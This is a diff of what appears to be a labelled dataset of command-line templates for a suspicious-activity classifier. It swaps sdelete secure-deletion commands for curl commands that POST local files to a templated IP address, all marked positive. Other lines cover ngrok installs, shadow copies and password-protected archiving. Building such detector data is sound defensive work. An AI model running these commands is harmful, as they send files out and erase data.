@@ -1,16 +1,16 @@
-1	cmd /c "sdelete.exe -f -q ${local_file_path}"
-1	powershell -c "sdelete.exe -f -q ${local_file_path}"
-1	sdelete -f -q -accepteula ${local_file_path}
-1	cmd /c "sdelete -f -q -accepteula ${loal_file_path}"
-1	powershell -c "sdelete -f -q -accepteula ${local_file_path}"
-1	sdelete.exe -f -q -accepteula ${local_file_path}
-1	cmd /c "sdelete.exe -f -q -accepteula ${local_file_path}"
-1	powershell -c "sdelete.exe -f -q -accepteula ${local_file_path}"
-0	arp.exe -g
-0	mstsc.exe /v:${ip_address} /f /admin
-0	cmd /c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-0	choco install putty
-0	powershell -c "mstsc /v:${ip_address} /f /remoteGuard"
-0	choco install -f Megasync
-0	certutil -encode -Unicode -gmt error.txt encode.txt
-0	cmd /c "choco install -y ngrok"
+1	cmd /c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	powershell -c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}
+1	cmd /c "curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	powershell -c "curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+0	powershell -c "rmdir /q /s ${local_file_path}"
+0	powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p${password}"
+0	wmic shadowcopy call create Volume=C:
+0	sdelete.exe -s -accepteula ${local_file_path}
+0	cat email.txt | ssmtp ${username}@${domain} 2> /dev/null
+0	powershell -c "taskkill.exe /F /im ${process_name}"
+0	cmd /c "sdelete -f -q -accepteula ${loal_file_path}"
+0	cmd /c "netstat.exe"
